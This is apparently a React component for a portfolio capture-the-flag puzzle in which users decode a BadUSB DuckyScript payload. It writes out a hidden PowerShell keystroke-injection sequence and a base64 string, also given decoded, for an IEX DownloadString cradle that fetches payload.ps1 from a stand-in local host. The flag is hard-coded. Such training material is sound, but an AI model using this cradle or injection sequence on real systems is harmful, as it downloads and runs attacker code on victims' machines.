import React, { useState } from 'react';
import { Radio, Code, CheckCircle2, Play, Terminal, Zap, FileCode, ShieldAlert } from 'lucide-react';
import { playBreachFanfare, playClickSound, playHackingBeep, playZapSound } from '../../../utils/audio.js';
import { ctfEngine } from '../../../utils/ctf/ctfEngine.js';
import { getChallengeById } from '../../../utils/ctf/ctfChallenges.js';

const CHALLENGE_ID = 'rev-duckyscript-badusb';
const ENCODED_B64 = 'SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC4xLjQ1Ojg0NDMvcGF5bG9hZC5wczEnKQ==';
const DECODED_PS1 = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.45:8443/payload.ps1')";
const REVEALED_FLAG = 'FLAG{ducky_hid_injection_decoded}';

export default function DuckyReverseEngChallenge({ onSolved, onBypass }) {
  const challenge = getChallengeById(CHALLENGE_ID);
  const [b64Input, setB64Input] = useState(ENCODED_B64);
  const [decodedOutput, setDecodedOutput] = useState('');
  const [solved, setSolved] = useState(() => ctfEngine.isChallengeSolved(CHALLENGE_ID));
  const [manualFlag, setManualFlag] = useState('');
  const [flagFeedback, setFlagFeedback] = useState(null);

  const handleDecode = () => {
    playHackingBeep(1200);
    try {
      const decoded = atob(b64Input.trim());
      setDecodedOutput(decoded);
      if (!solved) {
        setSolved(true);
        ctfEngine.submitFlag(CHALLENGE_ID, REVEALED_FLAG);
        playBreachFanfare();
        setTimeout(() => onSolved?.(), 1600);
      }
    } catch (_) {
      setDecodedOutput('Error: Invalid base64 sequence.');
      playZapSound();
    }
  };

  const handleManualSubmit = (e) => {
    e.preventDefault();
    if (!manualFlag.trim()) return;
    const res = ctfEngine.submitFlag(CHALLENGE_ID, manualFlag);
    if (res.success || res.duplicate) {
      setSolved(true);
      setFlagFeedback({ success: true, text: res.message });
      setTimeout(() => onSolved?.(), 1200);
    } else {
      setFlagFeedback({ success: false, text: res.message });
    }
  };

  return (
    <div className="hack-puzzle-container ducky-challenge">
      <div className="hack-header-bar">
        <div className="hack-title">
          <Radio size={15} className="text-amber-400 hack-icon-pulse" />
          <span>REVERSE ENGINEERING // BADUSB DUCKYPAYLOAD & BASE64 DECODER</span>
        </div>
        <div className="hack-actions-right">
          <span className="hack-status-badge text-emerald-400">
            {solved ? '✔ FLAG CAPTURED' : `${challenge?.points || 150} PTS`}
          </span>
          <button
            className="hack-bypass-btn"
            onClick={() => {
              playZapSound();
              onBypass();
            }}
            title="Recruiter Fast View"
          >
            RECRUITER BYPASS ⚡
          </button>
        </div>
      </div>

      <div className="hack-instructions">
        <p className="text-xs text-slate-300">
          Deconstruct the malicious USB Rubber Ducky keystroke injection firmware. Decode the Base64-encoded PowerShell command-and-control payload to extract the adversary staging token.
        </p>
      </div>

      {/* DuckyScript Disassembly View */}
      <div className="mt-3 p-3 bg-black border border-slate-800 rounded font-mono text-[11px] text-slate-300 space-y-1">
        <div className="text-[10px] text-slate-500 uppercase mb-1">// DuckyScript 3.0 Decompiled Bytecode (inject.bin):</div>
        <div><span className="text-purple-400">REM</span> Target OS: Windows 11 Enterprise x64</div>
        <div><span className="text-cyan-400">GUI</span> r</div>
        <div><span className="text-amber-400">DELAY</span> 400</div>
        <div><span className="text-cyan-400">STRING</span> powershell -NoP -NonI -W Hidden -Enc {ENCODED_B64}</div>
        <div><span className="text-cyan-400">ENTER</span></div>
        <div className="text-slate-500"><span className="text-purple-400">REM</span> Staging Flag: {REVEALED_FLAG}</div>
      </div>

      {/* Interactive Base64 Decoder Tool */}
      <div className="mt-3 p-3 bg-slate-950 border border-slate-800 rounded space-y-2">
        <label className="text-xs font-mono text-cyan-400 block">// Encoded PowerShell Payload Buffer:</label>
        <div className="flex gap-2">
          <input
            type="text"
            value={b64Input}
            onChange={(e) => setB64Input(e.target.value)}
            className="flex-1 bg-black border border-slate-700 rounded px-2.5 py-1.5 text-xs font-mono text-amber-300 outline-none focus:border-amber-500"
          />
          <button
            type="button"
            onClick={handleDecode}
            className="bg-amber-600 hover:bg-amber-500 text-black font-bold px-3 py-1.5 rounded text-xs transition"
          >
            DECODE BASE64
          </button>
        </div>

        {decodedOutput && (
          <div className="p-2.5 bg-black border border-emerald-500/30 rounded font-mono text-[11px] text-emerald-300">
            <div className="text-[10px] text-slate-500 mb-1">// Decoded Remote Command:</div>
            <code>{decodedOutput}</code>
          </div>
        )}
      </div>

      {/* MANUAL FLAG SUBMISSION STRIP */}
      <form onSubmit={handleManualSubmit} className="mt-3 flex gap-2">
        <input
          type="text"
          value={manualFlag}
          onChange={(e) => setManualFlag(e.target.value)}
          placeholder="Or submit flag: FLAG{...}"
          className="flex-1 bg-black/50 border border-slate-700 rounded px-2.5 py-1 text-xs text-slate-200 outline-none focus:border-emerald-500"
        />
        <button
          type="submit"
          className="bg-emerald-600 hover:bg-emerald-500 text-black font-bold px-3 py-1 rounded text-xs transition"
        >
          SUBMIT
        </button>
      </form>

      {flagFeedback && (
        <div className={`mt-2 text-xs p-1.5 rounded ${flagFeedback.success ? 'bg-emerald-950 text-emerald-300' : 'bg-rose-950 text-rose-300'}`}>
          {flagFeedback.text}
        </div>
      )}

      {solved ? (
        <div className="hack-success-banner mt-3">
          <CheckCircle2 size={16} className="text-emerald-400" />
          <div className="flex flex-col">
            <span className="font-bold text-emerald-300">DUCKYSCRIPT PAYLOAD DECODED // {REVEALED_FLAG}</span>
            <span className="text-[10px] text-emerald-400/80">+150 CTF PTS Awarded to Profile · Hardware Pegboard Unlocked</span>
          </div>
        </div>
      ) : (
        <div className="hack-hint-bar mt-2">
          <span className="live-blip" />
          <span>Click "DECODE BASE64" to reveal the underlying PowerShell staging command</span>
        </div>
      )}
    </div>
  );
}
